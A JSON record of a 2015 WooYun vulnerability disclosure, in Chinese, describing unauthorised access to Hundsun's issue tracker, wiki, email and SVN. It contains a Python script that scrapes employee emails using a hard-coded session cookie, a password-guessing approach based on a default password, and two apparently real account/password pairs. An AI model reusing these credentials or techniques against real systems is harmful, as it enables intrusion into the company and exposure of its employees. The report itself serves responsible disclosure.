{"id": 71497, "wybug_id": "wooyun-2015-0146066", "wybug_title": "恒生电子某系统漏洞导致重要信息泄露（可能在SVN源码中插入后门/获取生产服务器密码/营业执照等信息等）", "wybug_corp": "hundsun.com", "wybug_author": "路人甲", "wybug_date": "2015-10-11 22:35", "wybug_open_date": "2015-11-29 17:58", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向公众公开  简要描述： 恒生电子某系统所有的SVN源码，从branch来看，有众多客户。。。可操作SVN代码，这个有点严重了。 详细说明：  探测恒生电子网站时，发现此系统http://service.hundsun.com:8180/secure/Dashboard.jspa，可以注册新用户。\n\n登录系统后，能看到众多项目的信息，都是一些bug信息，并没有什么卵用。。。\n\n注意到首页有一个跳转链接，直接跳转到另外一个系统http://114.215.173.137:8190/，可以用上面的账号和密码登录。仍旧是一些无用的信息。\n\n翻了一会，终于找了有点用的信息：众多邮箱。\n\n写了一个脚本，取了所有的邮箱信息。\nimport urllib2import refrom bs4 import BeautifulSoup as bfsdef getEmails():\tf = open('email.txt', 'w')\temailid_regexp = re.compile(\"[a-z 0-9]@hundsun.com\") \ti_header = dict()\ti_header['Cookie'] = 'confluence.browse.space.cookie=space-blogposts; confluence-sidebar.width=285; JSESSIONID=087FE70CCD6A31476BAE054690277635'\tfor i in range(0,3):\t\turl = 'http://114.215.173.137:8190/'\\\t\t\t'dopeopledirectorysearch.action?queryString&ShowOnlyPersonal=false&startIndex=' + str(i*50)\t\ttry:\t\t\trequest = urllib2.Request(url, headers = i_header)\t\t\tresponse = urllib2.urlopen(request)\t\t\tsoup  = bfs(response.read(), from_encoding = 'UTF-8')\t\t\temails = soup.find_all(text=emailid_regexp)\t\t\tfor email in emails:\t\t\t\tf.write(email + '\\n')\t\t\tf.flush()\t\texcept:\t\t\tpassif __name__ == '__main__':\tgetEmails()\n\n\n又google了一下恒生电子的邮箱地址https://mail.hundsun.com，发现可以进行爆破，但是用了几个字典均没有什么收获。。。继续google搜索信息，发现了这个http://www.wuyida.com/content/KrHgmYF783FnfOFn.html，员工手册，仔细研读一番，有默认密码！！！\n\n用新密码的规律继续破，这次终于有了结果，得到两枚账号密码。qigw hundsun@2tuliang13492 hundsun@1登陆邮箱看看去，收获还不少来看看生产环境的账号和密码，从时间来看是最新的，敏感位置已经打码，我没有去登陆，厂商懂就可以了。\n\n还有客户的超管账号密码\n\n来一个带营业执照的截图，虽然打码了，厂商能看懂的\n\n重头戏还是邮件中看到的SVN信息，所有代码，各种文档，有权限操作SVN，能插后门哦！！！我只是在浏览器中查看了一下，没有checkout，厂商放心吧，都已经打码。我只想说一句，你们客户真多。\n\n\n\n\n\n到此为止了，只是检测，未操作任何数据，敏感部分已经打码。   漏洞证明：  同上   修复方案：  问题很严重，敏感内容都帮你们打码了，给20rank可好   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-15 17:57 厂商回复： 非常感谢您的反馈，已进行处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}